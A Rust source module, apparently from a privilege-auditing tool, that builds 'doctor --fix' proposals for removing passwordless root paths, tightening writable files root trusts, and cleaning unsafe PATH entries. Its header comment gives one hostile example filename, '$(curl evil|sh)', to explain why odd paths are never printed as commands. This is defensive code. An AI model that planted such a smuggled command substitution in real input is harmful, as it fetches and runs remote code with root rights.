//! What `aido doctor --fix` offers, and what each change would mean.
//!
//! A proposal is text and an argv to print, never something this crate or the
//! front-end runs. Every change that needs root is a command for the human to
//! run in a shell they started, where the backend asks for their password; a
//! change that needs judgement — which line of a sudoers file, which entry of
//! a `PATH` — is written out by hand. aido never edits another tool's rules.
//!
//! Nothing here can grant a passwordless path or weaken a confirmation: the
//! only grant on offer is the `aido` group, whose every use asks for a
//! password, and everything else removes a way to root.
//!
//! # A printed command is a command someone will paste
//!
//! Paths come from the machine, and a world-writable directory lets anyone
//! choose a name in it — `$(curl evil|sh)` included. So a command is printed
//! only when every argument is printable ASCII without a backslash, and the
//! front-end quotes each one for the shell; anything else becomes a by-hand instruction, which names
//! the path through the terminal sanitizer instead of handing it to a shell.

use std::path::{Path, PathBuf};

use serde::Serialize;

use super::walk::STICKY;
use super::{
    AIDO_GROUP, CheckId, Finding, Grant, HostView, Kind, Lookup, ROOT_GROUPS, Report, Writer,
    accounts,
};

/// One change `doctor --fix` offers.
#[derive(Clone, Debug, PartialEq, Eq, Serialize)]
pub struct Proposal {
    /// What the human types to accept it.
    pub id: String,
    /// What it does, in a few words.
    pub title: String,
    /// What accepting it means: what it grants, removes, or breaks.
    pub means: String,
    /// Whether it needs root.
    pub needs_root: bool,
    /// The exact commands, backend prefix included. Empty when it is done by
    /// hand.
    pub commands: Vec<Vec<String>>,
    /// What to do by hand, when there is no command to print.
    pub by_hand: Option<String>,
}

/// The executables a proposal may name, located on this host. Absolute paths
/// only: a printed command must not depend on the `PATH` this report audits.
struct Tools {
    usermod: Option<&'static str>,
    gpasswd: Option<&'static str>,
    addgroup: Option<&'static str>,
    delgroup: Option<&'static str>,
    chmod: Option<&'static str>,
    chown: Option<&'static str>,
    visudo: Option<&'static str>,
}

impl Tools {
    fn locate(host: &dyn HostView) -> Self {
        let find = |candidates: &[&'static str]| {
            candidates.iter().copied().find(|candidate| {
                matches!(host.stat(Path::new(candidate)), Lookup::Found(meta) if meta.kind != Kind::Directory)
            })
        };
        Self {
            usermod: find(&["/usr/sbin/usermod", "/sbin/usermod"]),
            gpasswd: find(&["/usr/bin/gpasswd", "/bin/gpasswd"]),
            addgroup: find(&["/usr/sbin/addgroup"]),
            delgroup: find(&["/usr/sbin/delgroup"]),
            chmod: find(&["/usr/bin/chmod", "/bin/chmod"]),
            chown: find(&["/usr/bin/chown", "/bin/chown"]),
            visudo: find(&[
                "/usr/sbin/visudo",
                "/usr/bin/visudo-rs",
                "/usr/sbin/visudo-rs",
            ]),
        }
    }
}

/// Every change worth offering for this report, in the order they are asked:
/// the grant the operator came for, then removals of other paths to root.
///
/// `root_prefix` is the backend to run root commands through, `None` when the
/// subject is root already or there is no backend to name.
pub fn propose(host: &dyn HostView, report: &Report, root_prefix: Option<&str>) -> Vec<Proposal> {
    let tools = Tools::locate(host);
    let as_root = |argv: &[&str]| -> Vec<String> {
        root_prefix
            .into_iter()
            .chain(argv.iter().copied())
            .map(ToOwned::to_owned)
            .collect()
    };
    let mut proposals = Vec::new();
    proposals.extend(join_aido(report, &tools, &as_root));
    proposals.extend(leave_groups(report, &tools, &as_root));
    proposals.extend(review_rules(report, &tools, &as_root));
    proposals.extend(protect(host, report, &tools, &as_root));
    proposals.extend(fix_user_path(report));
    proposals
}

type AsRoot<'a> = dyn Fn(&[&str]) -> Vec<String> + 'a;

/// The findings of one check.
fn findings(report: &Report, id: CheckId) -> impl Iterator<Item = &Finding> {
    report
        .checks
        .iter()
        .filter(move |check| check.check == id)
        .flat_map(|check| &check.findings)
}

/// Joining aido's group: the grant phase 3 makes the operator's explicit act.
fn join_aido(report: &Report, tools: &Tools, as_root: &AsRoot<'_>) -> Option<Proposal> {
    let group = report.aido_group;
    if !group.exists || group.member || report.subject.is_root {
        return None;
    }
    let means = "Membership is what lets you ask aido to run an allowlisted command as root. \
                 Your backend asks for your password: this release installs no rule that skips \
                 it, though a backend that caches a credential (sudo for a few minutes, \
                 OpenDoas when it is built with timestamps) may not ask again straight away. It \
                 takes effect at your next login, and aido grants it to nobody on its own."
        .to_owned();
    let Some(name) = report.subject.name.as_deref() else {
        return Some(Proposal {
            id: "join-aido".to_owned(),
            title: format!("add your account to the {AIDO_GROUP} group"),
            means,
            needs_root: true,
            commands: Vec::new(),
            by_hand: Some(format!(
                "Your uid is not in /etc/passwd, so your account is managed elsewhere (a \
                 directory service): grant membership of the {AIDO_GROUP} group there."
            )),
        });
    };
    let command = match (tools.usermod, tools.addgroup, printable(name)) {
        (_, _, None) | (None, None, _) => None,
        (Some(usermod), _, Some(name)) => Some(as_root(&[
            usermod, "--append", "--groups", AIDO_GROUP, name,
        ])),
        (None, Some(addgroup), Some(name)) => Some(as_root(&[addgroup, name, AIDO_GROUP])),
    };
    Some(with_command(
        "join-aido".to_owned(),
        format!("add {name} to the {AIDO_GROUP} group"),
        means,
        command,
        format!("Add {name} to the {AIDO_GROUP} group with your distribution's account tool."),
    ))
}

/// Leaving each group that is root without a password.
fn leave_groups(report: &Report, tools: &Tools, as_root: &AsRoot<'_>) -> Vec<Proposal> {
    let mut out = Vec::new();
    for finding in findings(report, CheckId::GroupMemberships) {
        let Finding::GroupMembership {
            group,
            passwordless: true,
            listed,
            grants,
            ..
        } = finding
        else {
            continue;
        };
        let instead = ROOT_GROUPS
            .iter()
            .find(|g| g.name == group)
            .map_or("", |g| g.instead);
        let means = format!(
            "Being in the {group} group means {grants}. Leaving it removes that path to root. \
             {instead} Sessions already open keep the group until they end."
        );
        let name = report.subject.name.as_deref();
        let id = format!("leave-{group}");
        let title = format!("leave the {group} group");
        let proposal = match name {
            Some(name) if *listed => with_command(
                id,
                title,
                means,
                match (tools.gpasswd, tools.delgroup, printable(name)) {
                    (_, _, None) | (None, None, _) => None,
                    (Some(gpasswd), _, Some(name)) => {
                        Some(as_root(&[gpasswd, "--delete", name, group]))
                    }
                    (None, Some(delgroup), Some(name)) => Some(as_root(&[delgroup, name, group])),
                },
                format!(
                    "Remove {name} from the {group} group with your distribution's account tool."
                ),
            ),
            _ => by_hand(
                id,
                title,
                means,
                true,
                format!(
                    "This session holds the {group} group, but /etc/group does not list you in \
                     it: it comes from a directory service or from how this session was \
                     started. Remove it there, then log in again."
                ),
            ),
        };
        out.push(proposal);
    }
    out
}

/// One file's passwordless-rule findings, for [`review_rules`].
struct Reviewed<'a> {
    file: &'a Path,
    doas: bool,
    /// Lines holding a tag or default to remove.
    tags: Vec<usize>,
    /// Lines holding an include aido could not check.
    includes: Vec<usize>,
}

/// Each file that holds a passwordless-rule finding, with its lines sorted
/// into tags to remove and includes to rewrite.
fn reviewed_files(report: &Report) -> Vec<Reviewed<'_>> {
    let mut files: Vec<Reviewed<'_>> = Vec::new();
    for finding in findings(report, CheckId::PasswordlessRules) {
        let Finding::PasswordlessRule {
            file, line, grant, ..
        } = finding
        else {
            continue;
        };
        if !files.iter().any(|seen| seen.file == file.as_path()) {
            files.push(Reviewed {
                file,
                doas: *grant == Grant::Nopass,
                tags: Vec::new(),
                includes: Vec::new(),
            });
        }
        for entry in files.iter_mut().filter(|seen| seen.file == file.as_path()) {
            if *grant == Grant::Include {
                entry.includes.push(*line);
            } else {
                entry.tags.push(*line);
            }
        }
    }
    files
}

/// Reviewing each file that holds a passwordless rule.
fn review_rules(report: &Report, tools: &Tools, as_root: &AsRoot<'_>) -> Vec<Proposal> {
    let files = reviewed_files(report);
    let mut sudoers_n = 0usize;
    let mut doas_n = 0usize;
    let mut out = Vec::new();
    for Reviewed {
        file,
        doas,
        tags,
        includes,
    } in files
    {
        let join = |lines: &[usize]| {
            lines
                .iter()
                .map(ToString::to_string)
                .collect::<Vec<_>>()
                .join(", ")
        };
        let lines = join(&tags);
        let shown = file.display();
        if doas {
            doas_n = doas_n.saturating_add(1);
            out.push(by_hand(
                format!("review-doas-{doas_n}"),
                format!("review the passwordless rules in {shown}"),
                format!(
                    "Removes a standing grant that runs commands as root with no password, from \
                     line(s) {lines}. Whoever relies on it will be asked for one."
                ),
                true,
                format!(
                    "Edit {shown} as root, remove nopass from line(s) {lines}, and check the \
                     result with `doas -C {shown}` before you log out."
                ),
            ));
            continue;
        }
        sudoers_n = sudoers_n.saturating_add(1);
        // An include aido could not check is not a tag to remove: the line is
        // to be rewritten so that it can be checked, and what it names read.
        let rewrite = if includes.is_empty() {
            String::new()
        } else {
            let at = join(&includes);
            let lead = if tags.is_empty() { "" } else { ", and " };
            format!(
                "{lead}rewrite the include on line(s) {at} on one physical line, with no \
                 backslash continuation, so it can be checked"
            )
        };
        let remove = if tags.is_empty() {
            String::new()
        } else {
            format!("remove NOPASSWD or !authenticate from line(s) {lines}")
        };
        let remove_short = if tags.is_empty() {
            String::new()
        } else {
            format!("remove NOPASSWD from line(s) {lines}")
        };
        out.push(with_command(
            format!("review-sudoers-{sudoers_n}"),
            format!("review the passwordless rules in {shown}"),
            format!(
                "Opens {shown} in visudo, as root, so you can {remove}{rewrite}. Whoever relies \
                 on those rules will be asked for a password. aido does not edit another \
                 tool's rules: one mistake in sudoers can lock every administrator out, and \
                 visudo refuses to save one."
            ),
            tools
                .visudo
                .zip(file.to_str().and_then(printable))
                .map(|(visudo, path)| as_root(&[visudo, "-f", path])),
            format!("Edit {shown} as root with visudo and {remove_short}{rewrite}."),
        ));
    }
    out
}

/// Making each writable thing root trusts writable by root alone.
///
/// Including what the subject owns: a unit directory or a file root's shell
/// sources is root's whoever it belongs to now. Three things are not handed
/// to root:
///
/// * an entry of the subject's `PATH`, which is fixed by taking it off the
///   `PATH` (see [`fix_user_path`]): the directory may be `/tmp`, or a place
///   the subject works in, and the entry may not exist at all;
/// * a shared directory (sticky: `/tmp`), the filesystem root, or an account's
///   home directory, where `chown root` would break everyone who uses it. What
///   root trusts is moved out of it instead;
/// * nothing is ever done to the *contents* of what is handed back: it was
///   written by someone else, and the proposal says to inspect it first.
fn protect(
    host: &dyn HostView,
    report: &Report,
    tools: &Tools,
    as_root: &AsRoot<'_>,
) -> Vec<Proposal> {
    let homes = home_directories(host);
    let mut seen: Vec<&Path> = Vec::new();
    let mut out = Vec::new();
    let checks = [
        CheckId::UnitDirectories,
        CheckId::RootPath,
        CheckId::RootShellStartup,
    ];
    for finding in checks.iter().flat_map(|id| findings(report, *id)) {
        let Finding::Writable {
            path, at, writers, ..
        } = finding
        else {
            continue;
        };
        if seen.contains(&at.as_path()) {
            continue;
        }
        seen.push(at);
        let n = seen.len();
        let shown = at.display();
        let owner = writers.iter().any(|w| matches!(w, Writer::Owner { .. }));
        let others = writers
            .iter()
            .any(|w| matches!(w, Writer::Group { .. } | Writer::Everyone));
        let meta = host.stat(at);
        let is_dir = matches!(&meta, Lookup::Found(m) if m.kind == Kind::Directory);
        let shared = matches!(&meta, Lookup::Found(m) if m.mode & STICKY != 0)
            || at == Path::new("/")
            || is_home(at, &homes);
        if shared {
            out.push(move_out_of(n, path, at, writers));
            continue;
        }
        let looked_at = if is_dir {
            "Whatever it holds now was put there by someone who could write it: review that too."
        } else {
            "Its contents were written by someone who could write it: inspect them, or \
             reinstall the file from its package, before you rely on it."
        };
        let means = format!(
            "Only root will be able to change {shown}, which root trusts. {} can no longer \
             write there; if that was deliberate — a deploy group, say — give them a directory \
             root does not run anything from instead. {looked_at}",
            who(writers)
        );
        let title = format!("make {shown} writable by root alone");
        if !owner && !others {
            out.push(by_hand(
                format!("protect-{n}"),
                title,
                means,
                true,
                format!(
                    "An access control list, or a capability, lets you write {shown}; its mode \
                     bits do not show it. Inspect it with `getfacl {shown}` and remove the entry \
                     as root."
                ),
            ));
            continue;
        }
        let commands = at.to_str().and_then(printable).and_then(|path| {
            let mut commands = Vec::new();
            if owner {
                commands.push(as_root(&[tools.chown?, "root", path]));
            }
            if others {
                commands.push(as_root(&[tools.chmod?, "go-w", path]));
            }
            Some(commands)
        });
        out.push(Proposal {
            id: format!("protect-{n}"),
            title,
            means,
            needs_root: true,
            by_hand: commands.is_none().then(|| {
                format!(
                    "As root, make root the owner of {shown} and remove group and other write \
                     permission from it."
                )
            }),
            commands: commands.unwrap_or_default(),
        });
    }
    out
}

/// Taking each writable or relative entry off the subject's `PATH`.
///
/// Whoever can write an entry, or a directory above it, or create it, can put
/// a program there that runs instead of `sudo`. Removing the entry from the
/// `PATH` is the fix that cannot break anyone else: the directory may be
/// `/tmp`, may be the subject's own working directory, or may not exist.
fn fix_user_path(report: &Report) -> Vec<Proposal> {
    let mut out = Vec::new();
    for finding in findings(report, CheckId::UserPath) {
        let n = out.len().saturating_add(1);
        let (title, means) = match finding {
            Finding::RelativePathEntry { entry } => (
                format!(
                    "take the relative entry \"{}\" off your PATH",
                    entry.display()
                ),
                "A relative PATH entry is looked up in whatever directory you are in, so the \
                 next command you type in an agent's working tree may run a program the agent \
                 put there."
                    .to_owned(),
            ),
            Finding::Writable {
                path,
                writers,
                shadows,
                ..
            } => {
                let who = if owned_by_you(writers) {
                    "Anything running as you".to_owned()
                } else {
                    who(writers)
                };
                let title = if owned_by_you(writers) {
                    format!("take {} off your PATH, or move it later", path.display())
                } else {
                    format!("take {} off your PATH", path.display())
                };
                (
                    title,
                    format!(
                        "{who} can put a program in {}{}.",
                        path.display(),
                        shadows.as_ref().map_or_else(String::new, |exe| format!(
                            ", and it comes before {exe}: a program of that name placed there \
                             runs instead of the real one, and is handed the password you type \
                             to it"
                        ))
                    ),
                )
            }
            Finding::PasswordlessRule { .. } | Finding::GroupMembership { .. } => continue,
        };
        out.push(by_hand(
            format!("fix-path-{n}"),
            title,
            means,
            false,
            "Edit the shell startup file that sets PATH (~/.profile, ~/.bashrc, ~/.zshrc, or \
             fish's config.fish) and remove the entry, or move it after the system directories."
                .to_owned(),
        ));
    }
    out
}

/// What to do about something root trusts that sits in a directory which is
/// not root's to take: leave the directory alone and move the thing out.
fn move_out_of(n: usize, path: &Path, at: &Path, writers: &[Writer]) -> Proposal {
    let shown = at.display();
    by_hand(
        format!("protect-{n}"),
        format!("take {} out of {shown}", path.display()),
        format!(
            "{} can write {shown}, and root trusts {} through it. {shown} is shared or \
             someone's home, so it is left as it is and what root trusts is moved out of it.",
            who(writers),
            path.display()
        ),
        true,
        format!(
            "Do not change who owns {shown}. As root, inspect {} and, if it is yours, move it \
             to a directory only root can write, or remove it.",
            path.display()
        ),
    )
}

/// Whether `at` is a home directory: one `/etc/passwd` names, or one where the
/// convention puts them (`/home/<name>`, `/root`), which still holds when
/// `/etc/passwd` could not be read.
fn is_home(at: &Path, homes: &[PathBuf]) -> bool {
    at == Path::new("/root")
        || at.parent() == Some(Path::new("/home"))
        || homes.iter().any(|home| home == at)
}

/// Every account's home directory, as `/etc/passwd` gives them.
fn home_directories(host: &dyn HostView) -> Vec<PathBuf> {
    match host.read(Path::new(accounts::PASSWD)) {
        Lookup::Found(bytes) => accounts::parse_passwd(&bytes)
            .into_iter()
            .map(|account| account.home)
            .collect(),
        Lookup::Missing | Lookup::Unreadable(_) => Vec::new(),
    }
}

/// `text`, when every byte of it is printable ASCII and not a backslash, and
/// so survives being shown, quoted, and pasted into a shell exactly. A
/// backslash is out because shells disagree about it inside single quotes: fish
/// reads `\'` and `\\` there as an escaped quote and an escaped backslash, so
/// a name quoted for sh ends its word early in fish. A control character, a
/// byte that is not ASCII — an escape sequence, a bidirectional override, a
/// look-alike letter — is `None` too, and its proposal is done by hand.
pub(super) fn printable(text: &str) -> Option<&str> {
    text.bytes()
        .all(|byte| (b' '..=b'~').contains(&byte) && byte != b'\\')
        .then_some(text)
}

/// Whether the subject owns the thing.
fn owned_by_you(writers: &[Writer]) -> bool {
    writers
        .iter()
        .any(|w| matches!(w, Writer::Owner { you: true, .. }))
}

/// Who can write something, as the subject of a sentence.
fn who(writers: &[Writer]) -> String {
    let named = |name: &Option<String>, id: u32| {
        name.as_ref()
            .map_or_else(|| id.to_string(), |name| format!("{name} ({id})"))
    };
    let phrase = writers
        .iter()
        .map(|writer| match writer {
            Writer::You => "you".to_owned(),
            Writer::Owner { uid, name, .. } => format!("its owner, {}", named(name, *uid)),
            Writer::Group { gid, name, .. } => format!("the group {}", named(name, *gid)),
            Writer::Everyone => "everyone".to_owned(),
        })
        .collect::<Vec<_>>()
        .join(" and ");
    let mut chars = phrase.chars();
    chars
        .next()
        .map(|first| first.to_uppercase().chain(chars).collect())
        .unwrap_or_default()
}

/// A proposal with a command, or by hand when the command could not be built.
fn with_command(
    id: String,
    title: String,
    means: String,
    command: Option<Vec<String>>,
    otherwise: String,
) -> Proposal {
    Proposal {
        id,
        title,
        means,
        needs_root: true,
        by_hand: command.is_none().then_some(otherwise),
        commands: command.into_iter().collect(),
    }
}

/// A proposal done by hand.
fn by_hand(id: String, title: String, means: String, needs_root: bool, how: String) -> Proposal {
    Proposal {
        id,
        title,
        means,
        needs_root,
        commands: Vec::new(),
        by_hand: Some(how),
    }
}
